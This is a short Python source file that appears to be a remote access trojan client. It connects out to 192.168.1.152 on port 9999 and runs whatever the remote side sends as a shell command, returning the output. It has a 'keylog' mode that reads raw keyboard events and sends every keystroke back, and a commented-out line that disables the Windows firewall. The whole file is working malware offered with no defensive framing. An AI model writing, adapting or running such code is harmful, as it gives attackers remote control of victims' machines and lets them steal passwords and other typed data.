import os
import socket 
import subprocess

# subprocess.check_call('netsh.exe advfirewall set publicprofile state off')
s = socket.socket()
host = '192.168.1.152'
port = 9999
s.connect((host, port))

while True:
 	data = s.recv(1024)
 	if data[:2].decode("utf-8") == 'cd':
 		print(data[:2].decode("utf-8"))
 		print(data[2:].decode("utf-8"))
 		os.chdir(data[3:].decode("utf-8"))
 	if data[:6].decode("utf-8") == 'keylog':
 		try:
 			print("inside the keylog")
 			import evdev
	 		device = evdev.InputDevice('/dev/input/event0')
	 		for event in device.read_loop():
	 			if event.type == evdev.ecodes.EV_KEY:
	 				status = str(evdev.util.categorize(event))
	 				key = status.split('_')
	 				key = key[1].split(')')
	 				if key[1][2:] == 'down':
	 					s.send(str.encode(key[0] + ' '))
 		except:
 			print("keylog error")

 	if len(data) > 0:
 		try:
 			cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 			output_bytes = cmd.stdout.read() + cmd.stderr.read()
 			output_str = str(output_bytes, "utf-8")
 			s.send(str.encode(output_str + str(os.getcwd()) + '>'))
 			print(output_str)
 		except:
 			s.send(str.encode("command error"))

# Get ketlog



#close connection
s.close()

